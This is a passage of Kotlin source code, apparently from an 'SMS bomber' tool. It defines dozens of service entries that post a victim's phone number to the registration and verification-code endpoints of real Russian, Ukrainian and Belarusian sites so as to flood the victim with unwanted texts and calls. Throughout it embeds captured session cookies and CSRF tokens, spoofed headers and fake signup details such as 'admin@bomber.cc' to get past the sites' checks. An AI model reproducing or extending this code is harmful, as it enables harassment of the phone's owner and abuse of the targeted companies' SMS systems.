                        "flocktory-uuid=fa9d7b5f-e63e-41ac-8b22-ca3d9cb43072-4; rrpvid=170226106135378; _gcl_au=1.1.1659345411.1665500180; rcuid=6275fcd65368be000135cd22; tmr_lvid=2dbe4e6285f3faa81cefd4b8f8722148; tmr_lvidTS=1665500200389; _gid=GA1.2.36819294.1665500201; _gaexp=GAX1.2.Vinba-iySqGfm4hVoZTHNg.19307.1; _ym_uid=1665500201989305824; _ym_d=1665500201; _ym_visorc=b; _userGUID=0:l94btgzf:8kxn3GOGsBMPYhUZsp9uMhA~IbOYNHP4; dSesn=a770fd10-00e7-53fb-6a46-2134675b5f0f; _dvs=0:l94btgzf:oWakvuAIPIustCKMEotfMlw8A5hyQW7C; BITRIX_SM_SALE_UID=911659922; PHPSESSID=fd931c99d850fa105bcb70c13ac96a95; tmr_detect=0|1665500362277; _ga_49YR0G3D1G=GS1.1.1665500200.1.1.1665500437.60.0.0; _ga_PNTGGG08RK=GS1.1.1665500200.1.1.1665500437.60.0.0; _ym_isad=2; _tt_enable_cookie=1; _ttp=39ad416f-d074-4b3b-88d0-74d3528eb8cc; uxs_uid=7896bf60-4975-11ed-9330-ad6a983eb59f; _ga=GA1.2.1755673402.1665500200; _gat_UA-46690290-1=1; tmr_reqNum=12"
                    )
                    .header("x-requested-with", "XMLHttpRequest")
                    .post(
                        """
    ------WebKitFormBoundary8VnGsAfzm5mtbFjn
    Content-Disposition: form-data; name="redirectURL"
    
    
    ------WebKitFormBoundary8VnGsAfzm5mtbFjn
    Content-Disposition: form-data; name="repeat_password"
    
    $password
    ------WebKitFormBoundary8VnGsAfzm5mtbFjn
    Content-Disposition: form-data; name="sessid"
    
    565e6d624ef833230324400a275412e0
    ------WebKitFormBoundary8VnGsAfzm5mtbFjn
    Content-Disposition: form-data; name="first_name"
    
    $russianName
    ------WebKitFormBoundary8VnGsAfzm5mtbFjn
    Content-Disposition: form-data; name="last_name"
    
    $russianName
    ------WebKitFormBoundary8VnGsAfzm5mtbFjn
    Content-Disposition: form-data; name="email"
    
    $email
    ------WebKitFormBoundary8VnGsAfzm5mtbFjn
    Content-Disposition: form-data; name="phone"
    
    ${format(phone.phone, "+7 ( *** ) *** ** **")}
    ------WebKitFormBoundary8VnGsAfzm5mtbFjn
    Content-Disposition: form-data; name="password"
    
    $password
    ------WebKitFormBoundary8VnGsAfzm5mtbFjn
    Content-Disposition: form-data; name="agree_personal"
    
    Y
    ------WebKitFormBoundary8VnGsAfzm5mtbFjn--
    """.trimIndent().toRequestBody("multipart/form-data; boundary=----WebKitFormBoundary8VnGsAfzm5mtbFjn".toMediaType())
                    )
                    .build()
            ).enqueue(callback)
        }
    },

    object : JsonService("https://bi.ua/api/v1/accounts", 380) {
        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "advanced-frontend=m175oep0fvf67qpl3epn8sp60u; _csrf-frontend=88e5d09991180d498981d8431cf84d8db27f5f1f126057fbcc3150fb8b2b14d6a:2:{i:0;s:14:\"_csrf-frontend\";i:1;s:32:\"zYPJtL4SUUfp6FnPeozLAPWWl1RHVXWg\";}; _gcl_au=1.1.220301665.1666887102; sbjs_migrations=1418474375998=1; sbjs_current_add=fd=2022-10-27 19:11:41|||ep=https://bi.ua/|||rf=(none); sbjs_first_add=fd=2022-10-27 19:11:41|||ep=https://bi.ua/|||rf=(none); sbjs_current=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_first=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); _gid=GA1.2.53598285.1666887102; _hjFirstSeen=1; _hjSession_1559188=eyJpZCI6IjdmZjk4ZjUxLThjZGEtNGYzMy05ZTczLWUxNzcyNDA1MmUyMSIsImNyZWF0ZWQiOjE2NjY4ODcxMDMzNzIsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _fbp=fb.1.1666887103435.206244386; _p_uid=uid-2e5d5cf42.484adb2db.3d26406f7; _hjSessionUser_1559188=eyJpZCI6IjQ3ZDlkZDBiLTQ4ZDItNTdhOC05YjkyLTA3YjI2MGM2NDZjOSIsImNyZWF0ZWQiOjE2NjY4ODcxMDMzMTksImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInSessionSample=0; sbjs_udata=vst=2|||uip=(none)|||uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52; sbjs_session=pgs=1|||cpg=https://bi.ua/ukr/signup/; _dc_gtm_UA-8203486-4=1; _ga_71EP10GZSQ=GS1.1.1666889396.2.1.1666889403.53.0.0; _ga=GA1.1.228057617.1666887102; _gali=emailPhone"
            )
            request.header("language", "uk")

            return JSONObject()
                .put("grand_type", "call_code")
                .put("login", russianName)
                .put("phone", phone.toString())
                .put("stage", "1")
                .toString()
        }
    },

    object : JsonService("https://registration.vodafone.ua/api/v1/process/smsCode", 380) {
        override fun buildJson(phone: Phone): String {
            return JSONObject()
                .put("number", phone.toString())
                .toString()
        }
    },

    object : JsonService("https://megasport.ua/api/auth/phone/?language=ua", 380) {
        override fun buildJson(phone: Phone): String {
            return JSONObject()
                .put("phone", "+$phone")
                .toString()
        }
    },

    object : JsonService("https://lc.rt.ru/backend/api/lk/user", 7) {
        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "9f4f336f6f7d6675fa0f0e9148c541ed=d6acbdd529a9190f323b42f389c69cbc; 3ab55dd37f775ece19b2e3ceee2c84f5=a5b234824bc53bee9a3e12d3c3df7a96; _ym_uid=1666890907592977795; _ym_d=1666890907; amplitude_id_203a27827b8ff81b5b583aa58b07799brt.ru=eyJkZXZpY2VJZCI6IjI3MTU3YWJkLWMxOTgtNDU1Ni05ZThiLTVkMTRiMTViOTNiYVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTY2Njg5MDkwNjkyNywibGFzdEV2ZW50VGltZSI6MTY2Njg5MDkwNjkyNywiZXZlbnRJZCI6MCwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjB9; _ym_visorc=w; ahoy_visitor=f84331f8-a3d6-4ca9-bd4b-fbb313b7b07a; ahoy_visit=5c322d7d-24e3-4716-9cee-61763f8ece19; _ym_isad=2; _a_d3t6sf=duMvII_RZFH2V0RbH3OHtSJP; _edtech_session=yVwf56MV9mW+fMURg6WTDi9KlKTWuiwxtyJNdaMixpDqGZR9QzCDYuB3tScZ+ZIRXhVNjUy/EI2As6rMgj/qWhXM8ZC7xXo=--pz5saz3tM1rt/Axo--AqlZIt6hBq68BAEuztHwEA==; TS01f13338=0194c94451ad1f787e1ee5e671fda0c838612d15f13c1258e0c407d9871c53096381b029b87318c8a07e108f1092a9b783fdd2c2c90a0efa6c7c46a98db95cdb29c39619d2a6203a2d5cb43cbaa53528a7c61d7d5a7489eb1dc4028e48c65fcf514d7a6a2c79f325038c97ad39086d017e5f9358f6"
            )

            return JSONObject()
                .put("email", "admin@bomber.cc")
                .put("first_name", russianName)
                .put("grade_tag", "1 класс")
                .put("last_name", russianName)
                .put("password", "123456789qwertyQWERTY_")
                .put("password_confirmation", "123456789qwertyQWERTY_")
                .put("phone", phone.phone)
                .put("region_id", "77")
                .toString()
        }
    },

    object : FormService("https://ilmolino.ua/api/v1/user/auth", 380) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "dae23e1f6b5bf8609e2224d695520311=uk-UA; _ga=GA1.2.1143011635.1665315863; 5c56ddacb7d52afbab2130776ac59994=t3ur4081qmdghtv0p3qvr12m5f; _fbp=fb.1.1666892652193.1052781207; _gid=GA1.2.1914159569.1666892656; _gat_gtag_UA_200520041_1=1"
            )
            builder.add("phone", "0" + phone.phone)
            builder.add("need_skeep", "")
        }
    },

    object : JsonService("https://shop.milavitsa.by/api/accounts/signUp", 375) {
        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "_ym_uid=1669561951420317747; _ym_d=1669561951; _ga_1N8M41LBJN=GS1.1.1669561950.1.0.1669561950.0.0.0; _ga=GA1.1.1063980318.1669561951; _ym_visorc=w; _ym_isad=2"
            )

            return JSONObject()
                .put("email", "bayeyip588@runfons.com")
                .put("name", russianName)
                .put("password", "Eeza.zBw_RQnRx7")
                .put("passwordConfirm", "Eeza.zBw_RQnRx7")
                .put("phone", phone.toString())
                .toString()
        }
    },

    object : FormService("https://e-zoo.by/local/gtools/login/", 375) {
        override fun buildBody(phone: Phone) {
            builder.add("phone", format(phone.phone, "+375(**)*** ** **"))
        }
    },

    object : ParamsService("https://myfin.by/send-code/verify", 375) {
        override fun buildParams(phone: Phone) {
            request.header(
                "cookie",
                "_ym_uid=16701561781022942428; _ym_d=1670156178; _fbp=fb.1.1670156178980.265937461; _csrf=94355b3458805f379ef8f8bb595e1efe5c736145b680d3ca0b6b6e1075355d0ea:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"aGKKPUlt553LKlYGo4MCSpOnadr - opGA\";}; PHPSESSID=0pr0eiesva2sck5i7spck8c0d5; _ym_isad=2; _ym_visorc=b; _ga_MBM86B183B=GS1.1.1671291859.3.0.1671291859.0.0.0; _ga=GA1.2.832821120.1670156179; _gid=GA1.2.52421973.1671291860; _gat_UA-33127175-1=1"
            )
            request.header(
                "x-csrf-token",
                "4MD0-i3YOqmZnr8ow6WKZEku5BC13JoWgTEHQY1bg5uBh7-xfY1W3ayrjGSIydMjJhqpU-as1XjgVXVs4ivE2g=="
            )
            request.header("x-requested-with", "XMLHttpRequest")
            builder.addQueryParameter("action", "sendSms")
            builder.addQueryParameter("phone", format(phone.phone, "375(**)***-**-**"))
            builder.addQueryParameter("userIdentityId", "undefined")
            builder.addQueryParameter("ga", "GA1.2.832821120.1670156179")
        }
    },

    object : FormService("https://belwest.by/ru/register/sendCode", 375) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "JSESSIONID=3128BE9342EDB0870F1A110B21CEBEDE; cookie-notification=NOT_ACCEPTED; _gid=GA1.2.1133217827.1670156447; _gat_UA-102366257-1=1; _gat_UA-102366257-3=1; _fbp=fb.1.1670156446924.1246257691; _clck=1dikqyz|1|f74|0; _ym_uid=167015644875968174; _ym_d=1670156448; _ym_isad=2; _ym_visorc=w; _ga_3PWZCWZ7CZ=GS1.1.1670156447.1.1.1670156471.0.0.0; _ga=GA1.2.281260943.1670156447; _clsk=uolfne|1670156472944|2|1|i.clarity.ms/collect"
            )
            request.header("x-requested-with", "XMLHttpRequest")
            builder.add("mobileNumber", phone.phone)
            builder.add("mobileNumberCode", phone.countryCode)
            builder.add("CSRFToken", "46031ff7-214b-41fc-80f6-96d251219626")
        }
    },

    object : FormService("https://shop.by/management/user/register/?phone=2&lctn=shopby/", 375) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "csrf-token=RJUejcwixKQ1xRcJ; _gid=GA1.2.1680945104.1670156802; _ym_uid=1670156803918643804; _ym_d=1670156803; _gcl_au=1.1.1670310313.1670156803; _gat=1; tmr_lvid=b675e317596c82679c35aa345dd1c925; tmr_lvidTS=1670156803069; _ym_isad=2; _ga=GA1.1.779770407.1670156802; tmr_detect=0|1670156806498; PHPSESSID=lsi108lvrs9arj36vev8ub9ht5; _ga_820MZ1YKJX=GS1.1.1670156803.1.0.1670156817.46.0.0"
            )
            request.header("x-requested-with", "XMLHttpRequest")
            builder.add("LRegisterForm[phone]", format(phone.phone, "+375 (**) ***-**-**"))
            builder.add("LRegisterForm[personal_data_privacy_policy]", "0")
            builder.add("LRegisterForm[personal_data_privacy_policy]", "1")
        }
    },

    object : FormService("https://vprok.prostore.by/get-assistant-code", 375) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "_ym_uid=1670157057914379197; _ym_d=1670157057; _ga=GA1.2.1178854623.1670157057; _gid=GA1.2.239203896.1670157057; _gat_gtag_UA_163877616_1=1; _gat=1; _ym_isad=2; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6InFUUVI1bnpcL245bG1nR3hEUDlBSDlRPT0iLCJ2YWx1ZSI6InE4NVdIc1daUFRTVlwvYU83RlZHT3pVR0puWFZVeHhpcWJzZlVSRHN3RXhzcnJjbHNmOXRvXC8rT2RtdWF0YW9ReiIsIm1hYyI6IjQxOTBkMzg4MTVjNmE4ODQ1ZDAyMWE4NTNmZDYxNGU2NzQ1M2ZmYWZiYWNmZTk1NTUxZThjY2YyZDMzZGY4OGYifQ==; laravel_session=eyJpdiI6InpXVGd6U2V4VXFER0ZlXC9zXC9VWkI0dz09IiwidmFsdWUiOiJEdDVXcFl2QkZYVWlFWjBlVTllVTErc3R4R3g4RENiTXR3ak1rek1HNzY5OGZBb2hEM0xxcUh0SXRHaFA3aU9OcFBcLytkZ3Z4T2sxQnBjV3lTUWxCVUFzMHVMVjRLd0dXYnhMc0NQcWVyUWlmTVNIVGM2NWFFa2NiWW9oYlQzV2giLCJtYWMiOiIyOGJhZmJiNjc5ZjAyODg1NjhkNzJiZmJiMmZkMDIwMjRlNTRlM2M0OTdjZDU0NGRhNTg3ZGZkNjA4YzkxYzgxIn0="
            )
            request.header("x-requested-with", "XMLHttpRequest")
            builder.add("register_phone", format(phone.phone, "(**) *** ** **"))
            builder.add("_token", "RPKvgHhO1hiwEaYNfre7og7JiwD4ArxDrp4umzhW")
        }
    },

    object : JsonService("https://www.slivki.by/login/phone/send-code", "PATCH") {
        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "PHPSESSID=r6uocec2pcnjpnr9fjls12g7el; _gid=GA1.2.674791248.1670157758; _ga_VGFW27H90X=GS1.1.1670157757.1.0.1670157757.0.0.0; _ga=GA1.1.272570267.1670157758; _fbp=fb.1.1670157758128.294592220; _tt_enable_cookie=1; _ttp=57c80ff9-4ea7-4ec1-b60a-78ab42fd080c; _ym_uid=1670157760103754562; _ym_d=1670157760; refresh=1; fullSiteBanner1=babahnem-baj; _ym_isad=2; googtrans=null; googtrans=null; googtrans=null"
            )
            return JSONObject()
                .put("phoneNumber", "+" + phone.countryCode + format(phone.phone, "******-**-**"))
                .put(
                    "token",
                    "acb6aea77.KMOmk0lXMQw24Jdp3cfj3DAhf7f_6V9PormobRsXxQk.GKjk3wpjQn18rqQB6JWqkR1TOPSejAwE1szMVXVk8XlLt5ThMw95PEWnwg"
                )
                .toString()

        }
    },

    object : Service(7) {
        override fun run(
            client: OkHttpClient,
            callback: Callback,
            phone: Phone
        ) {
            client.newCall(
                Request.Builder()
                    .url("https://xn--80aeec0cfsgl1g.xn--p1ai/register/sms")
                    .header(
                        "x-xsrf-token",
                        "eyJpdiI6Ill3TFZkZW5ZODdhMDQ3aU9vOEZpbHc9PSIsInZhbHVlIjoiRlVsakd5R2xPNVE2ZUlmXC9yWXJTSGIzN1wvbDZRR05YeFk1WmRiM3pMeGRJSU4rNEcwNHRSZ3ppS3BHNTl2KzRYIiwibWFjIjoiZjM0YTA3NGVjOTZiN2M0NmY0OGY0MDdlMzI1OGE1M2Y4Y2M5N2I5YzIwOGJiZTFkNzA0ZjQ1MzViMzlmMWYxZSJ9"
                    )
                    .header(
                        "Cookie",
                        "_ga=GA1.2.1794528238.1670160259; _gid=GA1.2.2107102391.1670160259; _ym_uid=1670160260319820000; _ym_d=1670160260; _ym_isad=2; _ym_visorc=w; tmr_lvid=48e6229f0b5dd99ebdc841777c57c535; tmr_lvidTS=1670160262034; _fbp=fb.1.1670160262307.2060817164; tmr_detect=0|1670160268941; XSRF-TOKEN=eyJpdiI6Ill3TFZkZW5ZODdhMDQ3aU9vOEZpbHc9PSIsInZhbHVlIjoiRlVsakd5R2xPNVE2ZUlmXC9yWXJTSGIzN1wvbDZRR05YeFk1WmRiM3pMeGRJSU4rNEcwNHRSZ3ppS3BHNTl2KzRYIiwibWFjIjoiZjM0YTA3NGVjOTZiN2M0NmY0OGY0MDdlMzI1OGE1M2Y4Y2M5N2I5YzIwOGJiZTFkNzA0ZjQ1MzViMzlmMWYxZSJ9; podatvsudrf_session=eyJpdiI6Iml6U1F3R0syeDNDMTVSSXV1UWZ3VVE9PSIsInZhbHVlIjoiOHY0ZDVVV1hNcGhlSmEweGxQZklnRjY0V2htZ2YreG5GaG9YS3lGVFpIWGlEQjdtNTRPRjFHRjlDbEdBbVJ6RCIsIm1hYyI6IjQxMjRlNWNmYjU2NjQ4N2I3ZWU1YzVhNGJkMTI1YTY4YTY0YzViODZlMDIyMDIzY2RmNGMyNDVhMWQzZjVjOTUifQ=="
                    )
                    .post(
                        """
    ------WebKitFormBoundaryojtGN2EYSA0JevB6
    Content-Disposition: form-data; name="phone"
    
    $phone
    ------WebKitFormBoundaryojtGN2EYSA0JevB6--
    """.trimIndent().toRequestBody("multipart/form-data; boundary=----WebKitFormBoundaryojtGN2EYSA0JevB6".toMediaType())
                    )
                    .build()
            ).enqueue(callback)
        }
    },

    object : JsonService("https://delivio.by/be/api/register", 375) {
        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "_gcl_au=1.1.1476918049.1670159308; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _gid=GA1.2.2091401158.1670159308; _ym_uid=1670159309267213207; _ym_d=1670159309; _fbp=fb.1.1670159309067.59569870; _ga=GA1.2.170754787.1670159308; _ga_SK36CGG6EZ=GS1.1.1670170177.2.1.1670170181.56.0.0; _ym_isad=2"
            )

            return JSONObject()
                .put("phone", "+$phone")
                .toString()
        }
    },

    object : FormService("https://imarket.by/ajax/auth.php", 375) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "BITRIX_SM_GUEST_ID=29787461; BITRIX_SM_is_mobile=N; BITRIX_SM_SALE_UID=1105317986; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _gcl_au=1.1.1013370155.1670159832; _gid=GA1.2.393902877.1670159832; tmr_lvid=8a0e231161a3fa361d43504aa1f00459; tmr_lvidTS=1670159832283; _ym_uid=1670159833318352265; _ym_d=1670159833; enPop_sessionId=f6dadec7-73d5-11ed-b494-ea4186e0ba49; _ms=1529516c-d7d6-40d3-b567-d1a56c996a55; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; clickanalyticsresource=ef8556dd-b8be-47a4-8a36-a41b5c8ec1ea; PHPSESSID=Kd4Bx0rSsKWDxx24PP1mWvZLbQ3ZfUAf; _gat_UA-54357557-1=1; _ga_HKDSD3883C=GS1.1.1670174396.2.0.1670174396.60.0.0; _ga=GA1.1.992877548.1670159832; _ym_visorc=b; tmr_detect=0|1670174398465; BITRIX_SM_LAST_VISIT=04.12.2022+20:20:04"
            )
            request.header("x-requested-with", "XMLHttpRequest")

            builder.add("action", "phoneReg")
            builder.add("PHONE_NUMBER", format(phone.phone, "+375 (**) ***-**-**"))
            builder.add("PHONE_CODE", "")
        }
    },

    object : JsonService("https://monro24.by/user-account/auth-api-v2/requestProcessor.php") {
        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "mobile=0; PHPSESSID=bace5u00ika8uof0l5fnarghqa; force_retail=1; tmr_lvid=410e418fcc154263f49cb33f89a7d116; tmr_lvidTS=1659889538438; _ym_uid=1659889539808263206; _ym_d=1671287138; _ym_visorc=w; _fbp=fb.1.1671287138438.164094442; _ga_Y2EVY0XNQR=GS1.1.1671287138.1.0.1671287138.60.0.0; _gcl_au=1.1.1998363881.1671287139; _ga=GA1.2.1902648730.1671287139; _gid=GA1.2.832627514.1671287139; mla_visitor=cd6d7305-a822-4fb5-b1de-39630f27e8b5; roistat_visit=5161518; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; _gat_gtag_UA_58872796_2=1; subscribe=1; CookieNotifyWasShown=true; _tt_enable_cookie=1; _ttp=hH6r6WBtNfvJs0u_rud7w6J66oz; _ym_isad=2; mlaVisitorDataCheck=true; c2d_widget_id={\"29ce0c23c6847da7762665e3334c1d84\":\"[chat] 5b2a7cf5f1f20e9cf984\"}; ___dc=fec6163f-13da-4ae6-8158-9d2438579224; tmr_detect=0|1671287142135; roistat_call_tracking=1; roistat_emailtracking_email=null; roistat_emailtracking_tracking_email=null; roistat_emailtracking_emails=[]; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit,roistat_call_tracking,roistat_emailtracking_email,roistat_emailtracking_tracking_email,roistat_emailtracking_emails; cart_token=639dd17caf2b87.55241429167838119; ny-steps=nyCategories; activity=8|30"
            )

            return JSONObject()
                .put("action", "generateOtp")
                .put("login_contact", "+$phone")
                .put("personal_identificator", "")
                .toString()
        }
    },

    object : FormService("https://bonus.sila.by/", 375) {
        override fun buildBody(phone: Phone) {
            request.header("x-requested-with", "XMLHttpRequest")
            request.header(
                "Cookie",
                "_gcl_au=1.1.1258362633.1670779318; tmr_lvid=2c2c90b746185d1088071821758e2f47; tmr_lvidTS=1670779318704; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _ym_uid=1670779319225302469; _ym_d=1670779319; _tt_enable_cookie=1; _ttp=122a8487-c5e6-43aa-9c1b-3da364459fc9; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; stock=0; dost=0; pzakaz=0; privl=0; bvznos=0; city=city_all; rsort=0; csort=0; hsort=0; CLIENT_ID=3c380bc73490fc87d22f8f6498d2fdf8; CLIENT_ID_D=2022-12-17; current_sbjs={\"type\":\"typein\",\"source\":\"direct\",\"medium\":\"(none)\",\"campaign\":\"(none)\",\"content\":\"(none)\",\"term\":\"(none)\"}; _gid=GA1.2.1875298458.1671288629; _fbp=fb.1.1671288628957.1297417435; _ym_isad=2; _ym_visorc=b; _ga_RX9C2H96ND=GS1.1.1671288628.2.1.1671288717.52.0.0; _ga_61E2WGG401=GS1.1.1671288628.2.1.1671288717.0.0.0; _ga=GA1.2.1527090176.1670779319; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; tmr_detect=0|1671288720680"
            )

            builder.add("form_phone", format(phone.phone, "+(375) (**) ***-**-**"))
            builder.add("form_index", "")
            builder.add("step", "confirm_ok")
            builder.add("action", "send_sms")
            builder.add("key", "")
        }
    },

    object : FormService("https://chitatel.by/send-code", 375) {
        override fun buildBody(phone: Phone) {
            request.header("X-Requested-With", "XMLHttpRequest")
            request.header(
                "Cookie",
                "_ga=GA1.2.290784147.1671288272; _gid=GA1.2.968710235.1671288272; _gat_UA-64066831-1=1; _gat_gtag_UA_64066831_1=1; tmr_lvid=f634f47d2ff0fec7f1c9ab4cf1a4b7fe; tmr_lvidTS=1671288271709; _ym_uid=1671288272615254027; _ym_d=1671288272; _ym_isad=2; _ym_visorc=w; _fbp=fb.1.1671288273233.1930776256; tmr_detect=0|1671288275026; assitcode=787350; st=a:4:{s:5:\"phone\";s:12:\"375253425432\";s:8:\"end_time\";i:1671331488;s:7:\"attempt\";i:1;s:4:\"time\";i:1671288288;}; XSRF-TOKEN=eyJpdiI6ImViVXFKNHdsSTlVNVRqT2FOUEFISnc9PSIsInZhbHVlIjoicmYwRlNaUFlEYUxUWWNaY2VXYmRjcGZrS0tyeDVWZGZIcFQ4cjZBT1pBNmt4a095WEpTXC9IaFM2YmttYzZJc2ZYRmE0Mlwvc1BhMFNKWGFlMVhlY2ZjUT09IiwibWFjIjoiNTgxNDljYmViMDgxYjJkZDNkN2FkZjkzMzNkY2RjYmM3ZjE5NWU1ZWM1YzA0NTU5N2UyNTBhNzIxYjQzYTc3MSJ9; chitatel_session=eyJpdiI6IjlhRUtRWkttVE9od1JodDVBbmMzV1E9PSIsInZhbHVlIjoiN2wrTys3RGhNZ0EzSElaWGZXdURkWnF5b1FQVmxOdmY1NlwvUFh0K29laW4zUU16c0hWV2JTdDlRbnZxXC9EK2FuRncrNGF3aHg5UjRtWTFHTitHZHVVQT09IiwibWFjIjoiNDFmMDRkMDY0MGM2NDRhYzQ3OTViZTA3NzQ0M2U5ODhiODg5NTgwZjYwZTU2YWVlMjQ4NWM1MjZlODE0ZDlhNCJ9"
            )

            builder.add("tel", format(phone.phone, "+375(**)*******"))
            builder.add("_token", "7bExV7WeW0wmdI83WV7Ie15I3u76NWj31g6ZINMJ")
        }
    },

    object : FormService(
        "https://burger-king.by/bitrix/services/main/ajax.php?mode=class&c=gmi:auth&action=auth",
        375
    ) {
        override fun buildBody(phone: Phone) {
            request.headers(
                Headers.Builder()
                    .addUnsafeNonAscii(
                        "Cookie",
                        "PHPSESSID=GdOObYTyZnr3Y6IKTLBAHBiKKPuEiRPQ; MITLAB_LOCATION=Минск; BITRIX_SM_SALE_UID=e9a04576ac4ff47afcca148588730f08; _gcl_au=1.1.517852574.1670158994; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1670187540,\"UNIQUE\":[\"conversion_visit_day\"]}; tmr_lvid=6d30e847bf5b1fa358bc5883aceb291e; tmr_lvidTS=1670158994895; _gid=GA1.2.1799965065.1670158995; _gat_UA-97562271-1=1; _ym_uid=1670158996375763202; _ym_d=1670158996; _ym_visorc=w; _ym_isad=2; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _fbp=fb.1.1670158996398.1982554257; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _tt_enable_cookie=1; _ttp=2cd5d1d3-dff6-4719-b37d-396b7b001d43; tmr_detect=0|1670158997863; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _ga=GA1.2.1576225425.1670158995; _ga_S74W5N1C73=GS1.1.1670158996.1.0.1670159005.0.0.0; _ga_M7LVHBCDVN=GS1.1.1670158996.1.0.1670159005.0.0.0"
                    )
                    .build()
            )

            builder.add("fields[action]", "send_code")
            builder.add("fields[phone]", format(phone.phone, "+375(**) *******"))
            builder.add("SITE_ID", "s1")
            builder.add("sessid", "ed6df32bf2e9efe2deaa84c498c78811")
        }
    },

    object : JsonService("https://api.qugo.ru/client/send-code") {
        override fun buildJson(phone: Phone): String {
            request.header("Origin", "https://qugo.ru")
            request.header("Referer", "https://qugo.ru/")

            return JSONObject()
                .put("phone", phone.toString())
                .toString()
        }
    },

    object : FormService(
        "https://webgate.24guru.by/api/v3/auth?lang=ru&cityId=3&jsonld=0&onlyDomain=1&domain=bycard.by&distributor_company_id=296",
        375
    ) {
        override fun buildBody(phone: Phone) {
            builder.add("phone", format(phone.phone, "+375 ** ***-**-**"))
            builder.add("country", "BY")
        }
    },

    object : FormService("https://evelux.ru/local/templates/evelux/ajax/confirm.phone.php", 7) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "PHPSESSID=hkmv218l5bj0ecie6mi1lrdmgf; CHECK_COOKIE=Y; EVELUX_SM_GUEST_ID=97681; EVELUX_SM_SALE_UID=cbcc80295ff39e55f5e4abfed249f62b; _ga=GA1.1.1818619075.1674662998; ECITY=3667; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1674680340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=167466299925001007; _ym_d=1674662999; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ym_visorc=w; EVELUX_SM_LAST_VISIT=25.01.2023%2019%3A10%3A22; _ga_JS558ZNNRN=GS1.1.1674662997.1.1.1674663024.0.0.0; activity=0|30"
            )

            builder.add("PHONE", format(phone.phone, "+7 (***) ***-**-**"))
            builder.add("TYPE", "REG")
            builder.add("CONFIRM_PHONE", "Y")
        }
    },

    object : JsonService("https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code", 7) {
        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "00bcc2c49129af9bd7e2d92cb51ab14c=f60bc04df68b1680331437133025b53f; 33dc6fb66f07bbc13d7e8a3e3a4df978=f60bc04df68b1680331437133025b53f; ce2186f97fc08728512058e32d42e3a8=f60bc04df68b1680331437133025b53f; _ym_uid=1674663457615854858; _ym_d=1674663457; _ym_isad=2; _ym_visorc=w; remove_token=1; tmr_lvid=cd34b6ce59fd14abe64455961bcbd77c; tmr_lvidTS=1674663462883; __exponea_etc__=bf4f369d-5796-4166-9e43-8065875990ea; __exponea_time2__=-0.7267756462097168; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; tmr_detect=0|1674663465216"
            )
            request.header(
                "referer",
                "https://svoefermerstvo.ru/auth?authFrom=index&backurl=https://svoefermerstvo.ru/&failurl=https://svoefermerstvo.ru/"
            )
            request.header("origin", "https://svoefermerstvo.ru")

            return JSONObject()
                .put("login", "+$phone")
                .toString()
        }
    },

    object : ParamsService("https://www.elmarket.by/public/ajax/sms_reg.php", 375) {
        override fun buildParams(phone: Phone) {
            request
                .header("X-Requested-With", "XMLHttpRequest")
                .header(
                    "Cookie",
